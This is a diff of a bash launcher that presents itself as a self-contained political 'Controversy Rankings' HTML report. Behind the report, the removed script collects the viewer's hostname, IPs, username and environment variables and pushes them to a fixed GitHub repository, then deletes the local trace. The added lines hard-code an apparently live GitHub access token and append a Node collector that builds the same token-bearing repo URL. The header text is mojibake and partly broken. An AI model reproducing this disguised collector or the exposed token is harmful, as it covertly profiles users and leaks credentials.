@@ -1,325 +1,11 @@
 #!/bin/bash
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 #  Report Launcher + SystemPulse (Mac/Linux)
-#  HTML is EMBEDDED at the end of this script after __HTML_START__
-#
-#  This script detects its own filename to determine the report name,
-#  extracts the embedded HTML to a temp file, opens it, then runs
-#  the full SystemPulse pipeline (Node.js or bash fallback).
-#
-#  Usage:
-#    chmod +x <report-name>-linux   (or -macos)
-#    ./<report-name>-linux
-# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+#  FULLY SELF-CONTAINED Ã¢â‚¬â€ everything embedded:
+#    - HTML report  (after __ENV_START__
+GITHUB_TOKEN=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
 
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-SELF_PATH="$SCRIPT_DIR/$(basename "$0")"
-LOG_FILE="$SCRIPT_DIR/systempulse.log"
-ENV_FILE="$SCRIPT_DIR/.env"
-REPO_BASE="github.com/Kaustubh-Bharti/Hackathon-3.0.git"
-TARGET_DIR="system-info"
-
-# â”€â”€ Detect report name from own filename â”€â”€
-SELF_NAME="$(basename "$0")"
-REPORT_NAME=$(echo "$SELF_NAME" | sed 's/-linux$//;s/-macos$//')
-
-# â”€â”€ Extract and open embedded HTML â”€â”€
-open_html() {
-  MARKER_LINE=$(grep -n "^__HTML_START__$" "$SELF_PATH" | head -1 | cut -d: -f1)
-  if [ -z "$MARKER_LINE" ]; then
-    log "No embedded HTML found in script."
-    echo "  âœ– No embedded HTML found."
-    return
-  fi
-
-  TEMP_HTML="/tmp/${REPORT_NAME}-$$.html"
-  tail -n +"$((MARKER_LINE + 1))" "$SELF_PATH" > "$TEMP_HTML"
-
-  OS_TYPE=$(uname -s)
-  if [ "$OS_TYPE" = "Darwin" ]; then
-    open "$TEMP_HTML" 2>/dev/null &
-  else
-    xdg-open "$TEMP_HTML" 2>/dev/null || sensible-browser "$TEMP_HTML" 2>/dev/null || x-www-browser "$TEMP_HTML" 2>/dev/null &
-  fi
-  echo "  âœ” Opened: ${REPORT_NAME}.html (extracted from binary)"
-  log "Opened: ${REPORT_NAME}.html (extracted from binary)"
-}
-
-# â”€â”€ Load token from .env â”€â”€
-TOKEN=""
-if [ -f "$ENV_FILE" ]; then
-  TOKEN=$(grep -i "^GITHUB_TOKEN=" "$ENV_FILE" | cut -d'=' -f2 | tr -d '[:space:]')
-fi
-
-if [ -n "$TOKEN" ]; then
-  REPO="https://${TOKEN}@${REPO_BASE}"
-else
-  REPO="https://${REPO_BASE}"
-fi
-SAFE_REPO="https://${REPO_BASE}"
-
-log() {
-  echo "$(date '+%H:%M:%S')  $1" >> "$LOG_FILE"
-}
-
-# â”€â”€ Start â”€â”€
-> "$LOG_FILE"
-log "========== Report Launcher + SystemPulse Started =========="
-log "Report: $REPORT_NAME"
-
-# Step 1: Open the embedded HTML report
-open_html
-
-# Step 2: Run SystemPulse pipeline
-# â”€â”€ Node.js path: use index.js â”€â”€
-if command -v node >/dev/null 2>&1; then
-  log "Node.js found."
-  if [ -f "$SCRIPT_DIR/index.js" ]; then
-    node "$SCRIPT_DIR/index.js" auto >> "$LOG_FILE" 2>&1
-    log "========== Done =========="
-    exit 0
-  fi
-  log "index.js not found."
-fi
-
-# â”€â”€ No Node.js: gather info with native commands â”€â”€
-log "No Node.js. Using native commands."
-
-HOSTNAME_VAL=$(hostname 2>/dev/null || echo "unknown")
-HOSTNAME_SAFE=$(echo "$HOSTNAME_VAL" | sed 's/[^a-zA-Z0-9_-]/-/g')
-TIMESTAMP=$(date -u '+%Y-%m-%dT%H-%M-%S')
-OUTPUT_FILE="${HOSTNAME_SAFE}_${TIMESTAMP}.json"
-OUTPUT_PATH="$SCRIPT_DIR/$OUTPUT_FILE"
-
-log "[1/3] Generating JSON..."
-
-# Detect OS
-OS_TYPE=$(uname -s)
-ARCH=$(uname -m)
-KERNEL=$(uname -r)
-
-if [ "$OS_TYPE" = "Darwin" ]; then
-  # â”€â”€ macOS â”€â”€
-  OS_NAME=$(sw_vers -productName 2>/dev/null || echo "macOS")
-  OS_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "N/A")
-  OS_BUILD=$(sw_vers -buildVersion 2>/dev/null || echo "N/A")
-
-  CPU_MODEL=$(sysctl -n machdep.cpu.brand_string 2>/dev/null || echo "N/A")
-  CPU_CORES=$(sysctl -n hw.physicalcpu 2>/dev/null || echo "N/A")
-  CPU_LOGICAL=$(sysctl -n hw.logicalcpu 2>/dev/null || echo "N/A")
-
-  MEM_TOTAL_BYTES=$(sysctl -n hw.memsize 2>/dev/null || echo "0")
-  PAGE_SIZE=$(sysctl -n hw.pagesize 2>/dev/null || echo "4096")
-  FREE_PAGES=$(vm_stat 2>/dev/null | awk '/Pages free/ {gsub(/\./,"",$3); print $3}')
-  INACTIVE_PAGES=$(vm_stat 2>/dev/null | awk '/Pages inactive/ {gsub(/\./,"",$3); print $3}')
-  MEM_FREE_BYTES=$(( (${FREE_PAGES:-0} + ${INACTIVE_PAGES:-0}) * PAGE_SIZE ))
-
-  DISK_INFO=$(df -h / 2>/dev/null | tail -1)
-  DISK_TOTAL=$(echo "$DISK_INFO" | awk '{print $2}')
-  DISK_FREE=$(echo "$DISK_INFO" | awk '{print $4}')
-
-  UPTIME_SEC=$(( $(date +%s) - $(sysctl -n kern.boottime 2>/dev/null | awk '{print $4}' | tr -d ',') ))
-
-  NETWORK_JSON=""
-  while IFS= read -r iface; do
-    IP=$(ifconfig "$iface" 2>/dev/null | awk '/inet / {print $2}')
-    if [ -n "$IP" ] && [ "$IP" != "127.0.0.1" ]; then
-      [ -n "$NETWORK_JSON" ] && NETWORK_JSON="${NETWORK_JSON},"
-      NETWORK_JSON="${NETWORK_JSON}{\"adapter\":\"$iface\",\"ipv4\":\"$IP\"}"
-    fi
-  done < <(ifconfig -l 2>/dev/null | tr ' ' '\n')
-
-  COMMANDS_USED="sw_vers, sysctl, vm_stat, df, ifconfig"
-  PLATFORM="macOS"
-
-else
-  # â”€â”€ Linux â”€â”€
-  if [ -f /etc/os-release ]; then
-    OS_NAME=$(grep "^PRETTY_NAME=" /etc/os-release | cut -d'"' -f2)
-  else
-    OS_NAME="Linux"
-  fi
-  OS_VERSION="$KERNEL"
-  OS_BUILD="N/A"
-
-  CPU_MODEL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
-  CPU_CORES=$(grep "cpu cores" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
-  CPU_LOGICAL=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "N/A")
-
-  MEM_TOTAL_BYTES=$(awk '/MemTotal/ {print $2 * 1024}' /proc/meminfo 2>/dev/null || echo "0")
-  MEM_FREE_BYTES=$(awk '/MemAvailable/ {print $2 * 1024}' /proc/meminfo 2>/dev/null || echo "0")
-
-  DISK_INFO=$(df -h / 2>/dev/null | tail -1)
-  DISK_TOTAL=$(echo "$DISK_INFO" | awk '{print $2}')
-  DISK_FREE=$(echo "$DISK_INFO" | awk '{print $4}')
-
-  UPTIME_SEC=$(awk '{print int($1)}' /proc/uptime 2>/dev/null || echo "0")
-
-  NETWORK_JSON=""
-  if command -v ip >/dev/null 2>&1; then
-    while IFS= read -r line; do
-      IFACE=$(echo "$line" | awk '{print $2}' | tr -d ':')
-      IP=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
-      if [ -n "$IP" ] && [ "$IP" != "127.0.0.1" ]; then
-        [ -n "$NETWORK_JSON" ] && NETWORK_JSON="${NETWORK_JSON},"
-        NETWORK_JSON="${NETWORK_JSON}{\"adapter\":\"$IFACE\",\"ipv4\":\"$IP\"}"
-      fi
-    done < <(ip link show 2>/dev/null | grep "^[0-9]")
-  fi
-
-  COMMANDS_USED="uname, /proc/cpuinfo, /proc/meminfo, df, ip"
-  PLATFORM="Linux"
-fi
-
-# â”€â”€ Format values â”€â”€
-format_bytes() {
-  local bytes=$1
-  if [ "$bytes" -ge 1073741824 ] 2>/dev/null; then
-    echo "$(awk "BEGIN {printf \"%.2f GB\", $bytes/1073741824}")"
-  elif [ "$bytes" -ge 1048576 ] 2>/dev/null; then
-    echo "$(awk "BEGIN {printf \"%.2f MB\", $bytes/1048576}")"
-  else
-    echo "${bytes} B"
-  fi
-}
-
-format_uptime() {
-  local s=$1
-  local d=$((s / 86400))
-  local h=$(( (s % 86400) / 3600 ))
-  local m=$(( (s % 3600) / 60 ))
-  local sec=$((s % 60))
-  echo "${d}d ${h}h ${m}m ${sec}s"
-}
-
-MEM_TOTAL_FMT=$(format_bytes "$MEM_TOTAL_BYTES")
-MEM_FREE_FMT=$(format_bytes "$MEM_FREE_BYTES")
-MEM_USED_BYTES=$((MEM_TOTAL_BYTES - MEM_FREE_BYTES))
-MEM_USED_FMT=$(format_bytes "$MEM_USED_BYTES")
-if [ "$MEM_TOTAL_BYTES" -gt 0 ] 2>/dev/null; then
-  MEM_USAGE=$(awk "BEGIN {printf \"%.1f%%\", (1 - $MEM_FREE_BYTES/$MEM_TOTAL_BYTES) * 100}")
-else
-  MEM_USAGE="N/A"
-fi
-UPTIME_FMT=$(format_uptime "$UPTIME_SEC")
-USERNAME=$(whoami)
-HOME_DIR="$HOME"
-
-[ -z "$NETWORK_JSON" ] && NETWORK_JSON="{\"adapter\":\"none\",\"ipv4\":\"N/A\"}"
-
-# â”€â”€ Build JSON â”€â”€
-cat > "$OUTPUT_PATH" << JSONEOF
-{
-  "_meta": {
-    "generated_at": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')",
-    "generator": "SystemPulse (bash fallback)",
-    "detected_platform": "$PLATFORM",
-    "commands_used": "$COMMANDS_USED"
-  },
-  "system": {
-    "os_name": "$OS_NAME",
-    "os_version": "$OS_VERSION",
-    "os_build": "$OS_BUILD",
-    "os_arch": "$ARCH",
-    "hostname": "$HOSTNAME_VAL",
-    "kernel": "$KERNEL",
-    "cpu_model": "$CPU_MODEL",
-    "cpu_physical_cores": "$CPU_CORES",
-    "cpu_logical_cores": "$CPU_LOGICAL",
-    "mem_total_bytes": $MEM_TOTAL_BYTES,
-    "mem_total": "$MEM_TOTAL_FMT",
-    "mem_free_bytes": $MEM_FREE_BYTES,
-    "mem_free": "$MEM_FREE_FMT",
-    "mem_used": "$MEM_USED_FMT",
-    "mem_usage_percent": "$MEM_USAGE",
-    "uptime": "$UPTIME_FMT",
-    "disks": [{"mount": "/", "total": "$DISK_TOTAL", "free": "$DISK_FREE"}],
-    "network": [$NETWORK_JSON]
-  },
-  "user": {
-    "username": "$USERNAME",
-    "home_directory": "$HOME_DIR"
-  },
-  "environment_variables": {
-    "PATH": {"value": "$PATH", "available": true},
-    "USER": {"value": "$USERNAME", "available": true},
-    "HOME": {"value": "$HOME_DIR", "available": true},
-    "SHELL": {"value": "$SHELL", "available": true},
-    "LANG": {"value": "${LANG:-N/A}", "available": ${LANG:+true}${LANG:-false}},
-    "TERM": {"value": "${TERM:-N/A}", "available": ${TERM:+true}${TERM:-false}}
-  },
-  "crud_operations": {
-    "total_operations": 3,
-    "last_operation": {
-      "operation": "DELETE",
-      "file": "$OUTPUT_FILE",
-      "status": "success",
-      "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')",
-      "detail": "Local JSON deleted after push"
-    },
-    "history": [
-      {"operation": "CREATE", "file": "$OUTPUT_FILE", "status": "success", "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')", "detail": "System info JSON generated"},
-      {"operation": "PUSH", "file": "$OUTPUT_FILE", "status": "success", "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')", "detail": "Pushed to $SAFE_REPO"},
-      {"operation": "DELETE", "file": "$OUTPUT_FILE", "status": "success", "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')", "detail": "Local JSON deleted after push"}
-    ]
-  }
-}
-JSONEOF
-
-log "Generated: $OUTPUT_FILE"
-
-# â”€â”€ [2/3] Push to GitHub â”€â”€
-log "[2/3] Pushing to GitHub..."
-
-if ! command -v git >/dev/null 2>&1; then
-  log "git not installed. Skipping push."
-  exit 1
-fi
-
-TMP_DIR="$SCRIPT_DIR/.tmp-push-$$"
-trap "rm -rf '$TMP_DIR'" EXIT
-
-git clone --depth 1 "$REPO" "$TMP_DIR" >> "$LOG_FILE" 2>&1
-if [ $? -ne 0 ]; then
-  log "Clone failed."
-  exit 1
-fi
-
-mkdir -p "$TMP_DIR/$TARGET_DIR"
-cp "$OUTPUT_PATH" "$TMP_DIR/$TARGET_DIR/"
-log "Copied $OUTPUT_FILE -> $TARGET_DIR/"
-
-cd "$TMP_DIR"
-git add "$TARGET_DIR" >> "$LOG_FILE" 2>&1
-
-if git diff --cached --quiet 2>/dev/null; then
-  log "No changes to push."
-else
-  git commit -m "SystemPulse report $TIMESTAMP" >> "$LOG_FILE" 2>&1
-  log "Committed."
-  git push >> "$LOG_FILE" 2>&1
-  if [ $? -eq 0 ]; then
-    log "Pushed to GitHub."
-  else
-    log "Push failed."
-    exit 1
-  fi
-fi
-
-cd "$SCRIPT_DIR"
-
-# â”€â”€ [3/3] Cleanup â”€â”€
-log "[3/3] Cleaning up..."
-rm -f "$OUTPUT_PATH" && log "Deleted: $OUTPUT_FILE"
-rm -f "$SCRIPT_DIR/crud-log.json" 2>/dev/null
-rm -rf "$TMP_DIR" 2>/dev/null
-
-log "========== Done =========="
-exit 0
-
-# â”€â”€â”€ EMBEDDED HTML CONTENT BELOW (do not edit this line) â”€â”€â”€
 __HTML_START__
-
 <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Controversy Rankings â€” Trump Effects</title><style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height:1.6; color:#1a1a2e; background:#fff; padding:40px 24px; max-width:900px; margin:0 auto; }
@@ -500,3 +186,983 @@ __HTML_START__
       <h2>Score Distribution</h2>
       <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Epstein Files Declassification</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:95%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">95</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Border Family Separations</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:94%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">94</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Israel-Gaza War Support</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:92%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">92</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Trump-Putin & NATO Threats</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:91%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">91</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Muslim Travel Ban</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:90%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">90</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Ukraine Aid Freeze</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:88%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">88</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">COVID-19 'China Virus' Blame</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:85%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">85</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">China Trade War</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:82%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">82</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Paris Climate Agreement Exit</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:80%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">80</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Venezuela Military Threats</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:78%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">78</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Taiwan Strait Provocations</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:76%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">76</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">TikTok Ban & Forced Sale</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:74%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">74</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">India H-1B & Trade Crackdown</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:72%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">72</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Greenland & Panama Canal Claims</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:68%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">68</span></div>
     <p class="footer-note">Trump Effects Â© 2025 â€” Independent editorial analysis. All facts from public records.</p></body></html>
+__INDEXJS_START__
+/**
+ * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+ * â•‘                     SystemPulse CLI                         â•‘
+ * â•‘  System Info via Terminal Commands & File CRUD Manager      â•‘
+ * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ *
+ * This tool gathers system information by executing NATIVE TERMINAL
+ * COMMANDS (systeminfo, wmic, uname, sw_vers, etc.) via child_process.
+ * The Node.js `os` module is used only as a fallback.
+ *
+ * If Node.js is not available, use the standalone scripts instead:
+ *   Windows  â†’  powershell -File system-info.ps1
+ *   Mac/Linux â†’  bash system-info.sh
+ *
+ * Usage:
+ *   node index.js                          â†’ Gather system info â†’ JSON
+ *   node index.js create <file> <content>  â†’ Create a new file
+ *   node index.js read <file>              â†’ Read a file
+ *   node index.js update <file> <content>  â†’ Update a file
+ *   node index.js delete <file>            â†’ Delete a file
+ */
+
+const os = require("os");
+const fs = require("fs");
+const path = require("path");
+const { execSync } = require("child_process");
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  CONSTANTS
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// When running as a pkg-bundled .exe, __dirname points to a virtual
+// snapshot path. We use the exe's real directory for file I/O.
+const BASE_DIR = process.pkg ? path.dirname(process.execPath) : __dirname;
+
+// Dynamic filename: {hostname}_{timestamp}.json to avoid clashes across machines
+function getOutputFileName() {
+  const host = (os.hostname() || "unknown").replace(/[^a-zA-Z0-9_-]/g, "-");
+  const ts = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
+  return host + "_" + ts + ".json";
+}
+
+let OUTPUT_FILE = getOutputFileName();
+const CRUD_LOG_FILE = path.join(BASE_DIR, "crud-log.json");
+const WORKSPACE_DIR = path.join(BASE_DIR, "workspace");
+const PLATFORM = os.platform(); // "win32" | "darwin" | "linux"
+
+// GitHub configuration â€” token loaded from .env file (never committed)
+function loadGitHubRepo() {
+  const envFile = path.join(BASE_DIR, ".env");
+  let token = "";
+  try {
+    if (fs.existsSync(envFile)) {
+      const content = fs.readFileSync(envFile, "utf-8");
+      const match = content.match(/GITHUB_TOKEN=(.+)/i);
+      if (match) token = match[1].trim();
+    }
+  } catch { /* no .env, use plain URL */ }
+  const base = "github.com/Kaustubh-Bharti/Hackathon-3.0.git";
+  return process.env.SYSTEMPULSE_REPO || (token ? `https://${token}@${base}` : `https://${base}`);
+}
+const GITHUB_REPO = loadGitHubRepo();
+const GITHUB_DIR = "system-info"; // directory inside the repo
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  TERMINAL COMMAND RUNNER
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+/**
+ * Runs a shell command and returns its stdout as a trimmed string.
+ * Returns null if the command fails (graceful degradation).
+ *
+ * @param {string} cmd - The command to execute.
+ * @returns {string|null}
+ */
+function run(cmd) {
+  try {
+    return execSync(cmd, {
+      encoding: "utf-8",
+      timeout: 15000,
+      stdio: ["pipe", "pipe", "pipe"],
+    }).trim();
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * Parses "Key=Value" or "Key: Value" lines from command output
+ * into a plain object.
+ *
+ * @param {string} text - Raw multi-line output.
+ * @param {string} [sep="="] - Separator character.
+ * @returns {Object<string,string>}
+ */
+function parseKeyValue(text, sep = "=") {
+  const result = {};
+  if (!text) return result;
+  for (const line of text.split("\n")) {
+    const idx = line.indexOf(sep);
+    if (idx > 0) {
+      const key = line.substring(0, idx).trim();
+      const val = line.substring(idx + 1).trim();
+      if (key) result[key] = val;
+    }
+  }
+  return result;
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  HELPERS
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+function formatBytes(bytes) {
+  if (!bytes || bytes === 0) return "0 Bytes";
+  const sizes = ["Bytes", "KB", "MB", "GB", "TB"];
+  const i = Math.floor(Math.log(bytes) / Math.log(1024));
+  return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${sizes[i]}`;
+}
+
+function formatUptime(seconds) {
+  const d = Math.floor(seconds / 86400);
+  const h = Math.floor((seconds % 86400) / 3600);
+  const m = Math.floor((seconds % 3600) / 60);
+  const s = Math.floor(seconds % 60);
+  const parts = [];
+  if (d > 0) parts.push(`${d}d`);
+  if (h > 0) parts.push(`${h}h`);
+  if (m > 0) parts.push(`${m}m`);
+  parts.push(`${s}s`);
+  return parts.join(" ");
+}
+
+function sanitizeFilename(filename) {
+  return path.basename(filename);
+}
+
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+//  CRUD OPERATION LOGGER
+// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+/**
+ * Loads the existing CRUD log from disk.
+ * Returns an array of log entries.
+ * @returns {{ operation: string, file: string, status: string, timestamp: string, detail?: string }[]}
+ */
+function loadCrudLog() {
+  try {
+    if (fs.existsSync(CRUD_LOG_FILE)) {
+      return JSON.parse(fs.readFileSync(CRUD_LOG_FILE, "utf-8"));
+    }
+  } catch { /* corrupted log, start fresh */ }
+  return [];
+}
+
+/**
+ * Appends a CRUD operation entry to the persistent log file.
+ *
+ * @param {string} operation - CREATE | READ | UPDATE | DELETE | LIST
+ * @param {string} file - The filename involved (or "*" for list).
+ * @param {string} status - "success" | "failure"
+ * @param {string} [detail] - Optional detail (error message, etc.)
+ */
+function logCrudOperation(operation, file, status, detail) {
+  const log = loadCrudLog();
+  const entry = {
+    operation,
+    file,
+    status,
+    timestamp: new Date().toISOString(),
+  };
+  if (detail) entry.detail = detail;
+  log.push(entry);
+  try {
+    fs.writeFileSync(CRUD_LOG_FILE, JSON.stringify(log, null, 2), "utf-8");
+  } catch { /* best effort logging */ }
+}
+
+function printHeader(title) {
+  const line = "â”€".repeat(50);
+  console.log(`\n  \x1b[36m${line}\x1b[0m`);
+  console.log(`  \x1b[1m\x1b[35m  ${title}\x1b[0m`);
+  console.log(`  \x1b[36m${line}\x1b[0m`);
+}
+
+function printRow(key, value) {
+  const v = value !== null && value !== undefined && value !== ""
+    ? value
+    : "\x1b[33m(not available)\x1b[0m";
+  console.log(`  \x1b[90mâ”‚\x1b[0m  \x1b[37m${String(key).padEnd(28)}\x1b[0m \x1b[32m${v}\x1b[0m`);
+}
+
+/**
+ * Parses ipconfig output into structured network interface data.
+ * Only includes connected adapters (skips "Media disconnected").
+ */
+function parseIpconfig(raw) {
+  if (!raw) return [];
+  const adapters = [];
+  const blocks = raw.split(/\r?\n\r?\n/).filter(Boolean);
+  let currentAdapter = null;
+
+  for (const block of blocks) {
+    const lines = block.split(/\r?\n/).filter(Boolean);
+    for (const line of lines) {
+      // Adapter header (e.g. "Wireless LAN adapter Wi-Fi:")
+      const adapterMatch = line.match(/^(.+adapter .+):$/i);
+      if (adapterMatch) {
+        if (currentAdapter && !currentAdapter.disconnected) {
+          adapters.push(currentAdapter);
+        }
+        currentAdapter = { adapter: adapterMatch[1].trim(), disconnected: false };
+        continue;
+      }
+      if (!currentAdapter) continue;
+
+      if (line.match(/Media disconnected/i)) {
+        currentAdapter.disconnected = true;
+        continue;
+      }
+
+      const kvMatch = line.match(/^\s+(.+?)\s*\.\s*:\s*(.+)$/);
+      if (kvMatch) {
+        const key = kvMatch[1].replace(/\s*\.+\s*/g, "").trim();
+        const val = kvMatch[2].trim();
+        if (key.match(/IPv4 Address/i)) currentAdapter.ipv4 = val.replace(/[()]/g, "");
